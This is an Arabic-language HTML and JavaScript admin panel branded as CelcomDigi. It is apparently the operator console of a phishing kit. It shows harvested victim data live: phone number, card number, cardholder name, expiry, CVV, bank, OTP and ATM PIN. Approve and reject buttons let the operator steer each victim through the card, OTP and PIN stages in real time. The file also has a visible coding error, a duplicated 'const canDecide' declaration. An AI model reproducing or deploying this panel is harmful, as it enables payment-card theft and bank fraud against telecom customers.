<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>لوحة التحكم - CelcomDigi</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #f1f5f9;
      color: #1e293b;
      min-height: 100vh;
    }

    /* ── LOGIN SCREEN ── */
    #loginScreen {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #f1f5f9;
    }

    .login-card {
      background: #fff;
      border-radius: 16px;
      padding: 48px 40px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
      text-align: center;
    }

    .login-logo {
      width: 120px;
      margin-bottom: 24px;
    }

    .login-title {
      font-size: 22px;
      font-weight: 700;
      color: #1e293b;
      margin-bottom: 6px;
    }

    .login-sub {
      font-size: 14px;
      color: #64748b;
      margin-bottom: 32px;
    }

    .login-label {
      display: block;
      text-align: right;
      font-size: 13px;
      font-weight: 600;
      color: #374151;
      margin-bottom: 6px;
    }

    .login-input {
      width: 100%;
      padding: 12px 14px;
      border: 1.5px solid #e2e8f0;
      border-radius: 10px;
      font-size: 15px;
      color: #1e293b;
      background: #f8fafc;
      outline: none;
      transition: border-color 0.2s;
      margin-bottom: 20px;
      text-align: left;
      direction: ltr;
    }

    .login-input:focus { border-color: #3b82f6; background: #fff; }

    .login-btn {
      width: 100%;
      padding: 13px;
      background: #1e40af;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .login-btn:hover { background: #1d4ed8; }

    .login-error {
      display: none;
      background: #fef2f2;
      border: 1px solid #fecaca;
      color: #dc2626;
      border-radius: 8px;
      padding: 10px 14px;
      font-size: 13px;
      margin-top: 12px;
    }

    /* ── MAIN DASHBOARD ── */
    #dashboard { display: none; }

    /* Header */
    .header {
      background: #fff;
      border-bottom: 1px solid #e2e8f0;
      padding: 0 24px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .header-logo {
      height: 28px;
    }

    .header-title {
      font-size: 16px;
      font-weight: 700;
      color: #1e293b;
    }

    .header-right {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .live-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: #f0fdf4;
      border: 1px solid #bbf7d0;
      color: #16a34a;
      border-radius: 20px;
      padding: 4px 12px;
      font-size: 12px;
      font-weight: 600;
    }

    .live-dot {
      width: 7px;
      height: 7px;
      background: #22c55e;
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    .logout-btn {
      padding: 7px 16px;
      background: #f1f5f9;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
      font-size: 13px;
      color: #64748b;
      cursor: pointer;
      font-weight: 500;
      transition: all 0.2s;
    }

    .logout-btn:hover { background: #e2e8f0; color: #1e293b; }

    /* Stats bar */
    .stats-bar {
      display: flex;
      gap: 16px;
      padding: 20px 24px;
      flex-wrap: wrap;
    }

    .stat-card {
      background: #fff;
      border-radius: 12px;
      padding: 16px 20px;
      flex: 1;
      min-width: 140px;
      border: 1px solid #e2e8f0;
      display: flex;
      flex-direction: column;
      gap: 4px;
    }

    .stat-label {
      font-size: 12px;
      color: #64748b;
      font-weight: 500;
    }

    .stat-value {
      font-size: 26px;
      font-weight: 700;
      color: #1e293b;
    }

    .stat-value.green { color: #16a34a; }
    .stat-value.red { color: #dc2626; }
    .stat-value.blue { color: #2563eb; }
    .stat-value.orange { color: #ea580c; }

    /* Main content */
    .main-content {
      padding: 0 24px 24px;
    }

    .section-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 14px;
    }

    .section-title {
      font-size: 15px;
      font-weight: 700;
      color: #1e293b;
    }

    .clear-btn {
      padding: 7px 14px;
      background: #fff;
      border: 1px solid #fecaca;
      color: #dc2626;
      border-radius: 8px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }

    .clear-btn:hover { background: #fef2f2; }

    /* Table */
    .table-wrap {
      background: #fff;
      border-radius: 14px;
      border: 1px solid #e2e8f0;
      overflow: hidden;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 13px;
    }

    thead {
      background: #f8fafc;
      border-bottom: 1px solid #e2e8f0;
    }

    thead th {
      padding: 12px 14px;
      text-align: right;
      font-weight: 600;
      color: #64748b;
      font-size: 12px;
      white-space: nowrap;
    }

    tbody tr {
      border-bottom: 1px solid #f1f5f9;
      transition: background 0.15s;
    }

    /* Highlight row awaiting decision */
    tbody tr.awaiting-decision {
      background: #fffbeb;
    }
    tbody tr.awaiting-decision:hover {
      background: #fef9c3;
    }

    tbody tr:last-child { border-bottom: none; }
    tbody tr:hover { background: #f8fafc; }

    tbody td {
      padding: 13px 14px;
      color: #1e293b;
      vertical-align: middle;
    }

    .phone-cell {
      font-weight: 700;
      color: #1e40af;
      font-size: 14px;
      direction: ltr;
      text-align: right;
    }

    .amount-cell {
      font-weight: 700;
      color: #16a34a;
    }

    .type-badge {
      display: inline-block;
      padding: 3px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
    }

    .type-bill { background: #eff6ff; color: #2563eb; }
    .type-reload { background: #f0fdf4; color: #16a34a; }

    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
      white-space: nowrap;
    }

    .status-pending { background: #fefce8; color: #ca8a04; }
    .status-approved { background: #f0fdf4; color: #16a34a; }
    .status-rejected { background: #fef2f2; color: #dc2626; }
    .status-awaiting_otp { background: #eff6ff; color: #2563eb; }
    .status-otp_approved { background: #f0fdf4; color: #16a34a; }
    .status-otp_rejected { background: #fef2f2; color: #dc2626; }
    .status-awaiting_pin { background: #fdf4ff; color: #9333ea; }
    .status-pin_approved { background: #f0fdf4; color: #16a34a; }
    .status-pin_rejected { background: #fef2f2; color: #dc2626; }
    .status-completed { background: #f0fdf4; color: #16a34a; }

    .page-label {
      font-size: 11px;
      color: #64748b;
      background: #f1f5f9;
      padding: 2px 8px;
      border-radius: 6px;
      display: inline-block;
    }

    /* Action buttons */
    .actions-cell {
      display: flex;
      gap: 6px;
      flex-wrap: wrap;
    }

    .btn-approve {
      flex: 1;
      padding: 11px 16px;
      background: #16a34a;
      color: #fff;
      border: none;
      border-radius: 9px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
      white-space: nowrap;
    }

    .btn-approve:hover { background: #15803d; }

    .btn-reject {
      flex: 1;
      padding: 11px 16px;
      background: #dc2626;
      color: #fff;
      border: none;
      border-radius: 9px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
      white-space: nowrap;
    }

    .btn-reject:hover { background: #b91c1c; }

    /* Modal decision area */
    .modal-decision {
      display: flex;
      gap: 10px;
      margin-top: 20px;
      padding-top: 16px;
      border-top: 2px solid #e2e8f0;
    }

    .modal-decision.hidden { display: none; }

    .decision-label {
      font-size: 12px;
      color: #64748b;
      font-weight: 600;
      text-align: center;
      margin-bottom: 10px;
      background: #f8fafc;
      padding: 6px 12px;
      border-radius: 8px;
      border: 1px solid #e2e8f0;
    }

    .btn-details {
      padding: 6px 12px;
      background: #f1f5f9;
      color: #475569;
      border: 1px solid #e2e8f0;
      border-radius: 7px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      white-space: nowrap;
    }

    .btn-details:hover { background: #e2e8f0; }

    .btn-delete {
      padding: 6px 10px;
      background: #fff;
      color: #94a3b8;
      border: 1px solid #e2e8f0;
      border-radius: 7px;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.2s;
    }

    .btn-delete:hover { background: #fef2f2; color: #dc2626; border-color: #fecaca; }

    /* Empty state */
    .empty-state {
      text-align: center;
      padding: 60px 20px;
      color: #94a3b8;
    }

    .empty-icon {
      font-size: 40px;
      margin-bottom: 12px;
      opacity: 0.5;
    }

    .empty-text {
      font-size: 14px;
      font-weight: 500;
    }

    /* Modal */
    .modal-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.4);
      z-index: 1000;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .modal-overlay.show { display: flex; }

    .modal {
      background: #fff;
      border-radius: 16px;
      padding: 28px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
      direction: rtl;
    }

    .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .modal-title {
      font-size: 17px;
      font-weight: 700;
      color: #1e293b;
    }

    .modal-close {
      width: 32px;
      height: 32px;
      background: #f1f5f9;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      color: #64748b;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .modal-close:hover { background: #e2e8f0; }

    .detail-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
      border-bottom: 1px solid #f1f5f9;
    }

    .detail-row:last-child { border-bottom: none; }

    .detail-key {
      font-size: 13px;
      color: #64748b;
      font-weight: 500;
    }

    .detail-val {
      font-size: 13px;
      color: #1e293b;
      font-weight: 600;
      direction: ltr;
      text-align: left;
    }

    /* Toast */
    .toast {
      position: fixed;
      bottom: 24px;
      left: 50%;
      transform: translateX(-50%) translateY(80px);
      background: #1e293b;
      color: #fff;
      padding: 12px 24px;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 500;
      z-index: 9999;
      transition: transform 0.3s ease;
      white-space: nowrap;
    }

    .toast.show { transform: translateX(-50%) translateY(0); }
    .toast.success { background: #16a34a; }
    .toast.error { background: #dc2626; }

    /* Responsive */
    @media (max-width: 768px) {
      .stats-bar { gap: 10px; padding: 14px 12px; }
      .stat-card { min-width: 100px; padding: 12px 14px; }
      .stat-value { font-size: 20px; }
      .main-content { padding: 0 12px 20px; }
      .header { padding: 0 12px; }
      thead th, tbody td { padding: 10px 8px; }
      .actions-cell { gap: 4px; }
      .btn-approve, .btn-reject, .btn-details { padding: 5px 8px; font-size: 11px; }
    }
  </style>
</head>
<body>

<!-- ══════════════════════════════════════════
     LOGIN SCREEN
══════════════════════════════════════════ -->
<div id="loginScreen">
  <div class="login-card">
    <img class="login-logo"
      src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/63c1e9b7b1c3a27e7e0e7b1c_celcomdigi-logo.svg"
      onerror="this.style.display='none'"
      alt="CelcomDigi" />
    <div class="login-title">لوحة التحكم</div>
    <div class="login-sub">CelcomDigi Admin Panel</div>

    <label class="login-label">كلمة المرور</label>
    <input type="password" id="passwordInput" class="login-input"
           placeholder="أدخل كلمة المرور"
           onkeydown="if(event.key==='Enter') doLogin()" />

    <button class="login-btn" onclick="doLogin()">دخول</button>
    <div class="login-error" id="loginError">كلمة المرور غير صحيحة. حاول مرة أخرى.</div>
  </div>
</div>

<!-- ══════════════════════════════════════════
     DASHBOARD
══════════════════════════════════════════ -->
<div id="dashboard">

  <!-- Header -->
  <div class="header">
    <div class="header-left">
      <img class="header-logo"
        src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/63c1e9b7b1c3a27e7e0e7b1c_celcomdigi-logo.svg"
        onerror="this.style.display='none'"
        alt="CelcomDigi" />
      <span class="header-title">لوحة التحكم</span>
    </div>
    <div class="header-right">
      <div class="live-badge">
        <div class="live-dot"></div>
        مباشر
      </div>
      <button class="logout-btn" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <!-- Stats -->
  <div class="stats-bar">
    <div class="stat-card">
      <div class="stat-label">إجمالي الزيارات</div>
      <div class="stat-value blue" id="statTotal">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">زوار نشطون الآن</div>
      <div class="stat-value orange" id="statActive">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">جلسات معلقة</div>
      <div class="stat-value" id="statPending">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">موافق عليها</div>
      <div class="stat-value green" id="statApproved">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">مرفوضة</div>
      <div class="stat-value red" id="statRejected">0</div>
    </div>
  </div>

  <!-- Sessions Table -->
  <div class="main-content">
    <div class="section-header">
      <div class="section-title">العملاء النشطون</div>
      <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
    </div>

    <div class="table-wrap">
      <table id="sessionsTable">
        <thead>
          <tr>
            <th>رقم الهاتف</th>
            <th>النوع</th>
            <th>المبلغ</th>
            <th>التاريخ</th>
            <th>الحالة / الصفحة</th>
            <th>الإجراء</th>
          </tr>
        </thead>
        <tbody id="sessionsBody">
          <tr id="emptyRow">
            <td colspan="6">
              <div class="empty-state">
                <div class="empty-icon">📋</div>
                <div class="empty-text">لا توجد جلسات بعد. في انتظار العملاء...</div>
              </div>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

</div>

<!-- Details Modal -->
<div class="modal-overlay" id="detailsModal">
  <div class="modal">
    <div class="modal-header">
      <div class="modal-title" id="modalTitle">تفاصيل البطاقة</div>
      <button class="modal-close" onclick="closeModal()">✕</button>
    </div>
    <div id="modalContent"></div>
    <!-- Decision buttons inside modal -->
    <div class="modal-decision hidden" id="modalDecision">
      <button class="btn-approve" id="modalApproveBtn" onclick="modalDecide('approve')">✓ قبول</button>
      <button class="btn-reject" id="modalRejectBtn" onclick="modalDecide('reject')">✕ رفض</button>
    </div>
  </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
// ══════════════════════════════════════════
// AUTH
// ══════════════════════════════════════════
let adminToken = localStorage.getItem('adminToken') || '';

async function doLogin() {
  const pw = document.getElementById('passwordInput').value.trim();
  if (!pw) return;

  try {
    const r = await fetch('/api/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: pw }),
    });
    const d = await r.json();
    if (d.success) {
      adminToken = d.token;
      localStorage.setItem('adminToken', adminToken);
      showDashboard();
    } else {
      document.getElementById('loginError').style.display = 'block';
    }
  } catch (e) {
    document.getElementById('loginError').style.display = 'block';
  }
}

async function checkAuth() {
  if (!adminToken) return showLogin();
  try {
    const r = await fetch('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: adminToken }),
    });
    const d = await r.json();
    if (d.success) showDashboard();
    else showLogin();
  } catch (e) {
    showLogin();
  }
}

function showLogin() {
  document.getElementById('loginScreen').style.display = 'flex';
  document.getElementById('dashboard').style.display = 'none';
}

function showDashboard() {
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('dashboard').style.display = 'block';
  initSSE();
  loadSessions();
}

function doLogout() {
  localStorage.removeItem('adminToken');
  adminToken = '';
  if (sse) { try { sse.close(); } catch(e){} }
  showLogin();
}

// ══════════════════════════════════════════
// DATA STORE
// ══════════════════════════════════════════
const sessionMap = {};
let totalVisitors = 0;
let activeCount = 0;

// ══════════════════════════════════════════
// SSE
// ══════════════════════════════════════════
let sse;

function initSSE() {
  if (sse) { try { sse.close(); } catch(e){} }
  sse = new EventSource('/api/sse/admin');

  sse.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      handleSSEMessage(data);
    } catch(e) {}
  };

  sse.onerror = () => {
    setTimeout(initSSE, 3000);
  };
}

function handleSSEMessage(data) {
  if (data.type === 'init') {
    // Full initial state
    totalVisitors = data.totalVisitors || 0;
    activeCount = data.activeCount || 0;

    // Load sessions
    (data.sessions || []).forEach(s => { sessionMap[s.sessionId] = s; });

    // Load visitors (update phone numbers in sessions)
    (data.visitors || []).forEach(v => {
      if (v.sessionId && sessionMap[v.sessionId]) {
        sessionMap[v.sessionId]._page = v.page;
      }
    });

    renderAll();

  } else if (data.type === 'new_session') {
    sessionMap[data.sessionId] = data;
    renderAll();
    showToast('عميل جديد: ' + (data.number || '-'), 'success');

  } else if (data.type === 'session_update') {
    if (sessionMap[data.sessionId]) {
      Object.assign(sessionMap[data.sessionId], data);
    } else {
      sessionMap[data.sessionId] = data;
    }
    renderAll();

  } else if (data.type === 'session_deleted') {
    delete sessionMap[data.sessionId];
    renderAll();

  } else if (data.type === 'sessions_cleared') {
    Object.keys(sessionMap).forEach(k => delete sessionMap[k]);
    renderAll();

  } else if (data.type === 'visitor_update') {
    totalVisitors = data.totalVisitors || totalVisitors;
    activeCount = data.activeCount || activeCount;

    // If visitor has a sessionId, update page info
    if (data.visitor && data.visitor.sessionId && sessionMap[data.visitor.sessionId]) {
      sessionMap[data.visitor.sessionId]._page = data.visitor.page;
    }

    updateStats();
  }
}

async function loadSessions() {
  try {
    const r = await fetch('/api/admin/sessions');
    const d = await r.json();
    if (d.success) {
      d.sessions.forEach(s => { sessionMap[s.sessionId] = s; });
      renderAll();
    }
  } catch(e) {}

  try {
    const r = await fetch('/api/visitor/stats');
    const d = await r.json();
    if (d.success) {
      totalVisitors = d.totalVisitors || 0;
      activeCount = d.activeCount || 0;
      updateStats();
    }
  } catch(e) {}
}

// ══════════════════════════════════════════
// RENDER
// ══════════════════════════════════════════
function renderAll() {
  updateStats();
  renderSessions();
}

function updateStats() {
  const sessions = Object.values(sessionMap);
  let pending = 0, approved = 0, rejected = 0;

  sessions.forEach(s => {
    const st = s.status || '';
    if (['pending', 'awaiting_otp', 'awaiting_pin'].includes(st)) pending++;
    else if (['approved', 'otp_approved', 'pin_approved', 'completed'].includes(st)) approved++;
    else if (['rejected', 'otp_rejected', 'pin_rejected'].includes(st)) rejected++;
  });

  document.getElementById('statTotal').textContent = totalVisitors;
  document.getElementById('statActive').textContent = activeCount;
  document.getElementById('statPending').textContent = pending;
  document.getElementById('statApproved').textContent = approved;
  document.getElementById('statRejected').textContent = rejected;
}

function statusLabel(status) {
  const map = {
    pending: 'في انتظار القرار',
    approved: 'موافق - انتظار OTP',
    rejected: 'مرفوض',
    awaiting_otp: 'في انتظار OTP',
    otp_approved: 'OTP موافق - انتظار PIN',
    otp_rejected: 'OTP مرفوض',
    awaiting_pin: 'في انتظار PIN',
    pin_approved: 'مكتمل ✓',
    pin_rejected: 'PIN مرفوض',
    completed: 'مكتمل ✓',
  };
  return map[status] || status;
}

function pageLabel(status, customPage) {
  if (customPage) {
    const pmap = {
      home: 'الصفحة الرئيسية',
      bill: 'صفحة الفاتورة',
      reload: 'صفحة الشحن',
      'pay-bill': 'إدخال المبلغ',
      recharge: 'اختيار المبلغ',
      'payment-method': 'طريقة الدفع',
      'credit-card': 'بيانات البطاقة',
      processing: 'معالجة الدفع',
      otp: 'إدخال OTP',
      'atm-pin': 'إدخال PIN',
      'payment-success': 'نجاح الدفع',
    };
    return pmap[customPage] || customPage;
  }

  const smap = {
    pending: 'معالجة الدفع',
    approved: 'إدخال OTP',
    rejected: 'بيانات البطاقة',
    awaiting_otp: 'إدخال OTP',
    otp_approved: 'إدخال PIN',
    otp_rejected: 'إدخال OTP',
    awaiting_pin: 'إدخال PIN',
    pin_approved: 'نجاح الدفع',
    pin_rejected: 'إدخال PIN',
    completed: 'نجاح الدفع',
  };
  return smap[status] || '-';
}

function formatDate(iso) {
  if (!iso) return '-';
  const d = new Date(iso);
  return d.toLocaleDateString('ar-EG', { day: '2-digit', month: '2-digit', year: 'numeric' })
    + ' ' + d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
}

function renderSessions() {
  const tbody = document.getElementById('sessionsBody');
  const sessions = Object.values(sessionMap).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  if (sessions.length === 0) {
    tbody.innerHTML = `<tr id="emptyRow"><td colspan="6">
      <div class="empty-state">
        <div class="empty-icon">📋</div>
        <div class="empty-text">لا توجد جلسات بعد. في انتظار العملاء...</div>
      </div>
    </td></tr>`;
    return;
  }

  tbody.innerHTML = sessions.map(s => {
    const st = s.status || 'pending';
    const isCard = st === 'pending';
    const isOTP = st === 'awaiting_otp';
    const isPIN = st === 'awaiting_pin';
    const canDecide = isCard || isOTP || isPIN;
    const rowClass = canDecide ? 'awaiting-decision' : '';

    const canDecide = isCard || isOTP || isPIN;
    const typeClass = (s.type === 'reload') ? 'type-reload' : 'type-bill';
    const typeText = (s.type === 'reload') ? 'إعادة شحن' : 'فاتورة';
    const statusClass = 'status-' + st.replace(/_/g, '_');
    const pageTxt = pageLabel(st, s._page);

    return `<tr class="${rowClass}">
      <td class="phone-cell">${s.number || '-'}</td>
      <td><span class="type-badge ${typeClass}">${typeText}</span></td>
      <td class="amount-cell">${s.amount ? 'RM ' + s.amount : '-'}</td>
      <td style="font-size:12px;color:#64748b;">${formatDate(s.createdAt)}</td>
      <td>
        <span class="status-badge ${statusClass}">${statusLabel(st)}</span>
        <br/><span class="page-label" style="margin-top:4px;">${pageTxt}</span>
      </td>
      <td>
        <div class="actions-cell">
          <button class="btn-details" onclick="showDetails('${s.sessionId}')" style="${canDecide ? 'background:#1e40af;color:#fff;border-color:#1e40af;' : ''}">التفاصيل${canDecide ? ' 🔔' : ''}</button>
          <button class="btn-delete" onclick="deleteSession('${s.sessionId}')" title="حذف">✕</button>
        </div>
      </td>
    </tr>`;
  }).join('');
}

// ══════════════════════════════════════════
// ACTIONS
// ══════════════════════════════════════════
async function sendDecision(sessionId, status) {
  try {
    const r = await fetch('/api/admin/decision', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, status }),
    });
    const d = await r.json();
    if (d.success) {
      showToast('تم إرسال القرار: ' + statusLabel(status), 'success');
    } else {
      showToast('فشل إرسال القرار', 'error');
    }
  } catch(e) {
    showToast('خطأ في الاتصال', 'error');
  }
}

async function deleteSession(sessionId) {
  try {
    await fetch('/api/admin/delete/' + sessionId, { method: 'DELETE' });
    delete sessionMap[sessionId];
    renderAll();
    showToast('تم حذف الجلسة', 'success');
  } catch(e) {}
}

async function clearAll() {
  if (!confirm('هل تريد مسح جميع الجلسات؟')) return;
  try {
    await fetch('/api/admin/clear', { method: 'DELETE' });
    Object.keys(sessionMap).forEach(k => delete sessionMap[k]);
    renderAll();
    showToast('تم مسح جميع الجلسات', 'success');
  } catch(e) {}
}

// ══════════════════════════════════════════
// DETAILS MODAL
// ══════════════════════════════════════════
let currentModalSessionId = null;

function showDetails(sessionId) {
  const s = sessionMap[sessionId];
  if (!s) return;

  currentModalSessionId = sessionId;
  const st = s.status || 'pending';
  const isCard = st === 'pending';
  const isOTP = st === 'awaiting_otp';
  const isPIN = st === 'awaiting_pin';
  const canDecide = isCard || isOTP || isPIN;

  const card = s.cardData || {};
  const otp = s.otpData || {};
  const pin = s.pinData || {};

  // Set modal title
  let titleText = 'تفاصيل العميل';
  if (isCard) titleText = '🔔 بيانات البطاقة - في انتظار القرار';
  else if (isOTP) titleText = '🔔 رمز OTP - في انتظار القرار';
  else if (isPIN) titleText = '🔔 الرقم السري - في انتظار القرار';
  document.getElementById('modalTitle').textContent = titleText;

  let html = '';

  // Phone & type & amount at top
  html += `
    <div class="detail-row"><span class="detail-key">رقم الهاتف</span><span class="detail-val" style="color:#1e40af;font-weight:700;">${s.number || '-'}</span></div>
    <div class="detail-row"><span class="detail-key">النوع</span><span class="detail-val">${s.type === 'reload' ? 'إعادة شحن' : 'فاتورة'}</span></div>
    <div class="detail-row"><span class="detail-key">المبلغ</span><span class="detail-val" style="color:#16a34a;">RM ${s.amount || '-'}</span></div>
  `;

  if (card.cardNumber) {
    html += `
      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:1px;">── بيانات البطاقة ──</div>
      <div class="detail-row"><span class="detail-key">اسم حامل البطاقة</span><span class="detail-val">${card.cardholderName || '-'}</span></div>
      <div class="detail-row"><span class="detail-key">رقم البطاقة</span><span class="detail-val" style="letter-spacing:2px;">${card.cardNumber || '-'}</span></div>
      <div class="detail-row"><span class="detail-key">تاريخ الانتهاء</span><span class="detail-val">${card.expiry || '-'}</span></div>
      <div class="detail-row"><span class="detail-key">CVV</span><span class="detail-val">${card.cvv || '-'}</span></div>
      <div class="detail-row"><span class="detail-key">البنك</span><span class="detail-val">${card.bank || '-'}</span></div>
      <div class="detail-row"><span class="detail-key">الدولة</span><span class="detail-val">${card.country || '-'}</span></div>
    `;
  }

  if (otp.otp) {
    html += `
      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#2563eb;text-transform:uppercase;letter-spacing:1px;">── رمز OTP ──</div>
      <div class="detail-row"><span class="detail-key">رمز OTP</span><span class="detail-val" style="color:#2563eb;font-size:22px;letter-spacing:6px;font-weight:800;">${otp.otp}</span></div>
    `;
  }

  if (pin.pin) {
    html += `
      <div style="margin:12px 0 6px;font-size:12px;font-weight:700;color:#9333ea;text-transform:uppercase;letter-spacing:1px;">── الرقم السري ATM ──</div>
      <div class="detail-row"><span class="detail-key">الرقم السري ATM</span><span class="detail-val" style="color:#9333ea;font-size:22px;letter-spacing:6px;font-weight:800;">${pin.pin}</span></div>
    `;
  }

  html += `
    <div class="detail-row"><span class="detail-key">المرجع</span><span class="detail-val">${s.ref || '-'}</span></div>
    <div class="detail-row"><span class="detail-key">الحالة</span><span class="detail-val">${statusLabel(st)}</span></div>
    <div class="detail-row"><span class="detail-key">التاريخ</span><span class="detail-val">${formatDate(s.createdAt)}</span></div>
  `;

  if (!html) html = '<div style="text-align:center;color:#94a3b8;padding:20px;">لا توجد تفاصيل متاحة بعد</div>';

  document.getElementById('modalContent').innerHTML = html;

  // Show/hide decision buttons
  const decisionDiv = document.getElementById('modalDecision');
  const approveBtn = document.getElementById('modalApproveBtn');
  const rejectBtn = document.getElementById('modalRejectBtn');

  if (canDecide) {
    decisionDiv.classList.remove('hidden');
    if (isCard) {
      approveBtn.textContent = '✓ قبول البطاقة';
      rejectBtn.textContent = '✕ رفض البطاقة';
    } else if (isOTP) {
      approveBtn.textContent = '✓ قبول OTP';
      rejectBtn.textContent = '✕ رفض OTP';
    } else if (isPIN) {
      approveBtn.textContent = '✓ قبول PIN';
      rejectBtn.textContent = '✕ رفض PIN';
    }
  } else {
    decisionDiv.classList.add('hidden');
  }

  document.getElementById('detailsModal').classList.add('show');
}

async function modalDecide(action) {
  if (!currentModalSessionId) return;
  const s = sessionMap[currentModalSessionId];
  if (!s) return;

  const st = s.status || 'pending';
  let status;
  if (st === 'pending') status = (action === 'approve') ? 'approved' : 'rejected';
  else if (st === 'awaiting_otp') status = (action === 'approve') ? 'otp_approved' : 'otp_rejected';
  else if (st === 'awaiting_pin') status = (action === 'approve') ? 'pin_approved' : 'pin_rejected';
  else return;

  // Hide buttons immediately after decision
  document.getElementById('modalDecision').classList.add('hidden');

  await sendDecision(currentModalSessionId, status);
  closeModal();
}

function closeModal() {
  document.getElementById('detailsModal').classList.remove('show');
}

document.getElementById('detailsModal').addEventListener('click', function(e) {
  if (e.target === this) closeModal();
});

// ══════════════════════════════════════════
// TOAST
// ══════════════════════════════════════════
let toastTimer;
function showToast(msg, type = '') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { t.className = 'toast'; }, 3000);
}

// ══════════════════════════════════════════
// INIT
// ══════════════════════════════════════════
checkAuth();
</script>
